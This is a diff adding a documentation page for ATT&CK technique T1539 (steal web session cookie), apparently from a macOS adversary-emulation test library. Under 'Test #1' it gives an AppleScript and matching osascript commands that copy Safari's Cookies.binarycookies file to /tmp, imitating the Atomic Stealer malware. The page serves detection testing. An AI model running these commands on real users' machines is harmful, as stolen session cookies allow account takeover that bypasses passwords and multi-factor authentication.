@@ -1,0 +1,67 @@
+---
+title: T1539
+description: "Steal Web Session Cookie"
+---
+
+## Description from ATT&CK
+
+
+
+An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.
+
+Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)
+
+There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)
+
+There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)
+
+After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.
+
+
+## Tests
+
+### Test #1 - Copy Safari BinaryCookies
+
+This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.
+
+<span className="inline-flex items-center rounded-md bg-yellow-50 px-2 py-1 text-xs font-normal text-yellow-800 ring-1 ring-yellow-600/20 ring-inset">⚠️ TCC Required</span>
+
+**Input Arguments:**
+
+| Argument | Type | Default Value |
+|----------|------|---------------|
+| destination_path | str | `/tmp` |
+
+
+```applescript tab="<Code /> Script"
+tell application "Finder"
+  set destinationFolderPath to POSIX file "/tmp"
+  set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
+  duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
+end tell
+
+```
+
+
+```bash tab="<Terminal /> Execution"
+# Execute with default arguments
+osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "/tmp"' -e 'set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")' -e 'duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'
+
+# Or save to file and execute
+osascript copy_safari_binarycookies.scpt
+
+# With custom arguments
+osascript copy_safari_binarycookies.scpt "/tmp"
+```
+
+**Download Files**
+
+<DownloadButton filename="copy_safari_binarycookies.scpt" type="scpt" label="Download .scpt" />
+<DownloadButton filename="copy_safari_binarycookies.swift" type="swift" label="Download .swift" />
+<DownloadButton filename="copy_safari_binarycookies" type="binary" label="Download Binary" />
+<DownloadButton filename="copy_safari_binarycookies.app" type="app" label="Download Application Bundle" />
+
+## References
+
+- [MITRE ATT&CK T1539](https://attack.mitre.org/techniques/T1539/)
+- [Apple Script Language Guide](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
